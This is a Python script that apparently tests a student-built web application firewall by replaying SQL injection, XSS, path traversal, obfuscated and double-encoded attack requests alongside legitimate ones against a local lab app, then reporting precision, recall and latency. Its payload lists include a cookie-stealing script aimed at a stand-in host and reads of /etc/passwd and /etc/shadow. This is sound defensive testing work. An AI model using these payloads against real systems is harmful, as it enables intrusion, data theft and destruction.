#!/usr/bin/env python3
"""
replay_attacks.py - sends a fixed set of attack and legitimate requests
through the WAF and counts what was blocked. Automates the D03 system test
("50 known attack requests and 50 known legitimate requests are replayed").

Uses only the standard library, so it runs on Kali or on the VM.

    python3 evaluation/replay_attacks.py --target http://localhost:8080

A request counts as BLOCKED when the proxy answers 403. Any other answer
counts as ALLOWED. A 502 or a connection error is counted as an ERROR and
left out of the confusion matrix.

Groups:
  core attacks : sqli, xss, traversal, obfuscated
  core legit   : legit, legit_hard (normal text that looks a bit like SQL)
  known gaps   : evasion (double encoding), post_form (encoded form body)
The known gap groups are reported on their own. They are not mixed into the
headline numbers, because the proxy is not built to decode them.
"""
import argparse
import csv
import http.client
import statistics
import time
import urllib.parse

q = lambda s: urllib.parse.quote(s, safe="")

SQLI = [
    "1' OR '1'='1", "1' OR 1=1--", "' OR 1=1#", "admin'--",
    "1 UNION SELECT user,password FROM users--", "1' UNION SELECT NULL,NULL--",
    "1; DROP TABLE users--", "' OR 'a'='a", "1' AND SLEEP(5)--",
    "1' AND 1=1--", "1 OR 1=1", "'; EXEC xp_cmdshell('dir')--",
    "1' AND (SELECT COUNT(*) FROM users)>0--", "\" OR \"\"=\"", "1' ORDER BY 3--",
]
XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", "<body onload=alert(1)>", "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>", "\"><script>alert(document.cookie)</script>",
    "<script>document.location='http://evil.test/?c='+document.cookie</script>",
    "<a href=\"javascript:alert(1)\">x</a>", "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>", "<ScRiPt>alert(1)</ScRiPt>",
]
TRAVERSAL = [
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "....//....//etc/passwd",
    "/etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "../../../../etc/shadow",
    "/proc/self/environ", "php://filter/convert.base64-encode/resource=index.php",
]
OBFUSCATED = [
    "CASE WHEN 1=1 THEN 1 ELSE 0 END", "1'/**/OR/**/1=1--",
    "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2--", "1 oR 1=1", "1' AnD '1'='1",
    "IF(1=1,SLEEP(5),0)", "(SELECT 1 FROM (SELECT SLEEP(5))a)",
    "1 AND ASCII(SUBSTRING(user(),1,1))>64",
]
LEGIT = [
    ("/", ""), ("/login.php", ""), ("/index.php", ""), ("/about.php", ""),
    ("/instructions.php", ""), ("/setup.php", ""),
    ("/vulnerabilities/sqli/", "id=1&Submit=Submit"),
    ("/vulnerabilities/xss_r/", "name=Alice"),
    ("/vulnerabilities/xss_r/", "name=Bob Smith"),
    ("/search", "q=red shoes size 10"), ("/search", "q=blue jeans"),
    ("/search", "q=laptop bag"), ("/contact", "email=john.doe@example.com"),
    ("/products", "page=2"), ("/products", "sort=price&order=asc"),
    ("/products", "category=books&page=3"), ("/user", "id=42"),
    ("/user", "name=thabo"), ("/search", "city=Johannesburg"),
    ("/help", "q=how to reset password"),
    ("/comment", "text=Great product, thanks!"), ("/user", "name=Anna-Marie"),
    ("/search", "q=cheap flights to Cape Town"),
    ("/products", "product=shoes&size=10"), ("/", "lang=en"),
    ("/verify", "token=abc123def456"), ("/", "ref=homepage"),
    ("/", "utm_source=newsletter&utm_medium=email"), ("/cart", "item=17&qty=2"),
    ("/orders", "status=shipped"),
]
LEGIT_HARD = [
    "name=O'Brien", "q=select a size", "comment=I want to update my order or delete it",
    "q=where is the nearest store from here", "title=Tom & Jerry",
    "q=1 or 2 items", "msg=Drop me a line", "q=insert coin",
    "note=use the union room", "path=docs/readme.txt",
]
EVASION = [  # known gap: encoded twice, the proxy decodes once
    q(q("1' OR '1'='1")), q(q("<script>alert(1)</script>")),
    q(q("1 UNION SELECT user,password FROM users--")),
    "..%252F..%252F..%252Fetc%252Fpasswd", q(q("1'; DROP TABLE users--")),
]
POST_FORM = [  # known gap: form bodies arrive URL encoded and are not decoded
    "id=" + q("1' OR '1'='1"), "name=" + q("<script>alert(1)</script>"),
    "id=" + q("1 UNION SELECT user,password FROM users--"),
    "user=" + q("admin'--"), "id=" + q("1; DROP TABLE users--"),
]


def enc_query(qs):
    """Percent-encodes each value in a query string like a browser would."""
    parts = []
    for pair in qs.split("&"):
        k, _, v = pair.partition("=")
        parts.append(k + "=" + q(v) if "=" in pair else k)
    return "&".join(parts)


def build():
    """Returns a list of (group, expect, method, path, query, body)."""
    reqs = []
    for p in SQLI:
        reqs.append(("sqli", "block", "GET", "/vulnerabilities/sqli/", "id=" + q(p) + "&Submit=Submit", ""))
    for p in XSS:
        reqs.append(("xss", "block", "GET", "/vulnerabilities/xss_r/", "name=" + q(p), ""))
    for p in TRAVERSAL:
        reqs.append(("traversal", "block", "GET", "/vulnerabilities/fi/", "page=" + q(p), ""))
    for p in OBFUSCATED:
        reqs.append(("obfuscated", "block", "GET", "/", "id=" + q(p), ""))
    for path, qs in LEGIT:
        reqs.append(("legit", "allow", "GET", path, enc_query(qs), ""))
    for qs in LEGIT_HARD:
        k, _, v = qs.partition("=")   # one parameter each, "&" stays in the value
        reqs.append(("legit_hard", "allow", "GET", "/search", k + "=" + q(v), ""))
    for p in EVASION:
        reqs.append(("evasion", "block", "GET", "/vulnerabilities/sqli/", "id=" + p, ""))
    for b in POST_FORM:
        reqs.append(("post_form", "block", "POST", "/vulnerabilities/sqli/", "", b))
    return reqs


def send(host, port, method, path, qs, body):
    c = http.client.HTTPConnection(host, port, timeout=10)
    target = path + ("?" + qs if qs else "")
    headers = {}
    data = None
    if method == "POST":
        data = body.encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    t0 = time.perf_counter()
    try:
        c.request(method, target, body=data, headers=headers)
        r = c.getresponse()
        text = r.read().decode(errors="replace")
        ms = (time.perf_counter() - t0) * 1000
        return r.status, text, ms
    except Exception as e:
        return 0, str(e), 0.0
    finally:
        c.close()


def reason_of(text):
    for line in text.splitlines():
        if line.startswith("Reason:"):
            return line[7:].strip()
    return ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://localhost:8080")
    ap.add_argument("--csv", default="replay_results.csv")
    args = ap.parse_args()
    u = urllib.parse.urlsplit(args.target)
    host, port = u.hostname, u.port or 80

    rows, times = [], []
    for group, expect, method, path, qs, body in build():
        status, text, ms = send(host, port, method, path, qs, body)
        if status in (0, 502):
            got = "error"
        else:
            got = "block" if status == 403 else "allow"
            times.append(ms)
        rows.append({"group": group, "expect": expect, "got": got, "status": status,
                     "method": method, "path": path, "query": qs, "body": body,
                     "reason": reason_of(text), "ms": f"{ms:.1f}"})

    with open(args.csv, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        w.writeheader()
        w.writerows(rows)

    print(f"\nTarget {args.target}  |  {len(rows)} requests  |  details in {args.csv}\n")
    print(f"{'group':<12}{'sent':>5}{'blocked':>9}{'allowed':>9}{'error':>7}")
    for g in ["sqli", "xss", "traversal", "obfuscated", "legit", "legit_hard", "evasion", "post_form"]:
        r = [x for x in rows if x["group"] == g]
        print(f"{g:<12}{len(r):>5}{sum(x['got']=='block' for x in r):>9}"
              f"{sum(x['got']=='allow' for x in r):>9}{sum(x['got']=='error' for x in r):>7}")

    core = [x for x in rows if x["group"] in ("sqli", "xss", "traversal", "obfuscated", "legit", "legit_hard") and x["got"] != "error"]
    tp = sum(x["expect"] == "block" and x["got"] == "block" for x in core)
    fn = sum(x["expect"] == "block" and x["got"] == "allow" for x in core)
    fp = sum(x["expect"] == "allow" and x["got"] == "block" for x in core)
    tn = sum(x["expect"] == "allow" and x["got"] == "allow" for x in core)
    prec = tp / (tp + fp) if tp + fp else 0
    rec = tp / (tp + fn) if tp + fn else 0
    f1 = 2 * prec * rec / (prec + rec) if prec + rec else 0
    fpr = fp / (fp + tn) if fp + tn else 0
    print(f"\nCore confusion matrix (known gap groups left out)")
    print(f"  TP {tp}   FN {fn}   FP {fp}   TN {tn}")
    print(f"  precision {prec:.3f}   recall {rec:.3f}   F1 {f1:.3f}   FPR {fpr:.3f}")
    if times:
        s = sorted(times)
        print(f"  client round trip: mean {statistics.mean(times):.1f} ms, "
              f"p95 {s[int(len(s) * 0.95) - 1]:.1f} ms (includes network and backend)")

    print("\nMismatches in the core groups:")
    miss = [x for x in rows if x["group"] in ("sqli", "xss", "traversal", "obfuscated", "legit", "legit_hard")
            and x["expect"] != x["got"]]
    for x in miss:
        what = "MISSED" if x["expect"] == "block" else "FALSE POSITIVE"
        print(f"  {what:<15}[{x['group']}] {x['method']} {x['path']}?{x['query'][:70]}")
    if not miss:
        print("  none")


if __name__ == "__main__":
    main()
